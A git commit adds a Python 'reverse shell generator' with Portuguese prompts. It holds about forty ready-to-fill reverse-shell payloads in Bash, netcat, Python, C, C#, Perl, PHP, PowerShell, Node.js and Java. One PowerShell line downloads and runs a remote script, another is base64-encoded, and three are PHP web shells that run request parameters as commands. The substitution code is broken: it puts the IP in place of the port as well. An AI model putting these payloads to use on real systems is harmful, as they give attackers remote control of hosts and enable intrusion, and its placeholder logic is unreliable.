5aa942709aca89b0bc07f2dfb6e043c7caab6fbc
Machine <68440743+Machinh@users.noreply.github.com>
2023-08-05 16:43:18 +0000

    Create Gerador-Reverso.py

---
+++ Gerador-Reverso.py
@@ -0,0 +1,304 @@
+def show_available_reverses():
+    reverses = {
+        "Python #1": 'export RHOST="NaN";export RPORT=NaN;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\'',
+        "Python #2": '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("NaN",NaN));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' ''',
+        "Python3 #1": '''export RHOST="NaN";export RPORT=NaN;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' ''',
+        "Python3 #2": '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("NaN",NaN));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' ''',
+        "Python3 Windows": '''import os,socket,subprocess,threading;
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("NaN",NaN))
+
+p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()''',
+        "Python3 Shortest": '''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("NaN",NaN));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")' ''',
+        "Bash -i": '''sh -i >& /dev/tcp/NaN/NaN 0>&1''',
+        "Bash 196": '''0<&196;exec 196<>/dev/tcp/NaN/NaN; sh <&196 >&196 2>&196''',
+        "Bash Read Line": '''exec 5<>/dev/tcp/NaN/NaN;cat <&5 | while read line; do $line 2>&5 >&5; done''',
+        "Bash 5": '''sh -i 5<> /dev/tcp/NaN/NaN 0<&5 1>&5 2>&5''',
+        "Bash udp": '''sh -i >& /dev/udp/NaN/NaN 0>&1''',
+        "nc mkfifo": '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc NaN NaN >/tmp/f''',
+        "nc -e": '''nc NaN NaN -e sh''',
+        "nc.exe -e": '''nc.exe NaN NaN -e sh''',
+        "BusyBox nc -e": '''busybox nc NaN NaN -e sh''',
+        "nc -c": '''nc -c sh NaN NaN''',
+        "Rustcast": '''rcat NaN NaN -r sh''',
+        "C": '''#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void){
+    int port = NaN;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("NaN");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"sh", NULL};
+    execve("sh", argv, NULL);
+
+    return 0;       
+}''',
+        "C Windows": '''#include <winsock2.h>
+#include <stdio.h>
+#pragma comment(lib,"ws2_32")
+
+WSADATA wsaData;
+SOCKET Winsock;
+struct sockaddr_in hax; 
+char ip_addr[16] = "NaN"; 
+char port[6] = "NaN";            
+
+STARTUPINFO ini_processo;
+
+PROCESS_INFORMATION processo_info;
+
+int main()
+{
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+
+
+    struct hostent *host; 
+    host = gethostbyname(ip_addr);
+    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
+
+    hax.sin_family = AF_INET;
+    hax.sin_port = htons(atoi(port));
+    hax.sin_addr.s_addr = inet_addr(ip_addr);
+
+    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+
+    memset(&ini_processo, 0, sizeof(ini_processo));
+    ini_processo.cb = sizeof(ini_processo);
+    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
+    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
+
+    TCHAR cmd[255] = TEXT("cmd.exe");
+
+    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
+
+    return 0;
+}''',
+        "C# TCP Client": '''using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+
+
+namespace ConnectBack
+{
+    public class Program
+    {
+        static StreamWriter streamWriter;
+
+        public static void Main(string[] args)
+        {
+            using(TcpClient client = new TcpClient("NaN", NaN))
+            {
+                using(Stream stream = client.GetStream())
+                {
+                    using(StreamReader rdr = new StreamReader(stream))
+                    {
+                        streamWriter = new StreamWriter(stream);
+                        
+                        StringBuilder strInput = new StringBuilder();
+
+                        Process p = new Process();
+                        p.StartInfo.FileName = "sh";
+                        p.StartInfo.CreateNoWindow = true;
+                        p.StartInfo.UseShellExecute = false;
+                        p.StartInfo.RedirectStandardOutput = true;
+                        p.StartInfo.RedirectStandardInput = true;
+                        p.StartInfo.RedirectStandardError = true;
+                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                        p.Start();
+                        p.BeginOutputReadLine();
+
+                        while(true)
+                        {
+                            strInput.Append(rdr.ReadLine());
+                            //strInput.Append("\n");
+                            p.StandardInput.WriteLine(strInput);
+                            strInput.Remove(0, strInput.Length);
+                        }
+                    }
+                }
+            }
+        }
+
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err) { }
+            }
+        }
+
+    }
+}''',
+        "C# Bash -i": '''using System;
+using System.Diagnostics;
+
+namespace BackConnect {
+  class ReverseBash {
+    public static void Main(string[] args) {
+      Process proc = new System.Diagnostics.Process();
+      proc.StartInfo.FileName = "sh";
+      proc.StartInfo.Arguments = "-c \"sh -i >& /dev/tcp/NaN/NaN 0>&1\"";
+      proc.StartInfo.UseShellExecute = false;
+      proc.StartInfo.RedirectStandardOutput = true;
+      proc.Start();
+
+      while (!proc.StandardOutput.EndOfStream) {
+        Console.WriteLine(proc.StandardOutput.ReadLine());
+      }
+    }
+  }
+}''',
+        "Haskell #1": '''module Main where
+
+import System.Process
+
+main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc NaN NaN >/tmp/f"''',
+        "Perl": '''perl -e 'use Socket;$i="NaN";$p=NaN;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};''',
+        "Perl no sh": '''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"NaN:NaN");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''',
+        "PHP cmd": '''<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>''',
+        "PHP cmd 2": '''<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>''',
+        "PHP cmd small": '''<?=`$_GET[0]`?>''',
+        "PHP exec": '''php -r '$sock=fsockopen("NaN",NaN);exec("sh <&3 >&3 2>&3");' ''',
+        "PHP shell_exec": '''php -r '$sock=fsockopen("NaN",NaN);shell_exec("sh <&3 >&3 2>&3");' ''',
+        "PHP system": '''php -r '$sock=fsockopen("NaN",NaN);system("sh <&3 >&3 2>&3");' ''',
+        "PHP passthru": '''php -r '$sock=fsockopen("NaN",NaN);passthru("sh <&3 >&3 2>&3");' ''',
+        "PHP`": '''php -r '$sock=fsockopen("NaN",NaN);`sh <&3 >&3 2>&3`;' ''',
+        "PHP popen": '''php -r '$sock=fsockopen("NaN",NaN);popen("sh <&3 >&3 2>&3", "r");' ''',
+        "PHP proc_open": '''php -r '$sock=fsockopen("NaN",NaN);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'  ''',
+        "Windows ConPty": '''IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell NaN NaN''',
+        "PowerShell #1": '''$LHOST = "NaN"; $LPORT = NaN; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()''',
+        "PowerShell #2": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('NaN',NaN);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" ''',
+        "PowerShell #3": '''powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('NaN', NaN);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()" ''',
+        "PowerShell #4 (TLS)": '''$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('NaN', NaN);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()''',
+        "PowerShell #3 (Base64)": '''powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIATgBhAE4AIgAsAE4AYQBOACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==''',
+        "node.js": '''require('child_process').exec('nc -e sh NaN NaN')''',
+    "node.js #2": '''(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("sh", []);
+    var client = new net.Socket();
+    client.connect(NaN, "NaN", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})(); ''',
+        "Java #1": '''public class shell {
+    public static void main(String[] args) {
+        Process p;
+        try {
+            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/NaN/NaN 0>&1");
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}''',
+
+    }
+
+
+
+    print("Reverses disponíveis:")
+    for idx, reverse in enumerate(reverses, start=1):
+        print(f"{idx}. {reverse}")
+
+    return reverses
+
+
+def main():
+    while True:
+        ip = input("Bem vindo ao gerador reverso qual seu IP?: ")
+        porta = input("Digite a PORTA para conexão: ")
+
+        reverses = show_available_reverses()
+        escolha = int(input("Escolha o número da reverse que deseja usar: "))
+
+        reverse_escolhida = None
+        for idx, reverse in enumerate(reverses.values(), start=1):
+            if idx == escolha:
+                reverse_escolhida = reverse
+                break
+
+        if reverse_escolhida is None:
+            print("Reverse inválida. Tente novamente.")
+            continue
+
+        # Substituir os valores "NaN" pelos valores fornecidos pelo usuário
+        reverse_escolhida = reverse_escolhida.replace("NaN", ip).replace("NaN", porta)
+        print("Comando da reverse shell personalizado:")
+        print(reverse_escolhida)
+        break
+
+if __name__ == "__main__":
+    main()
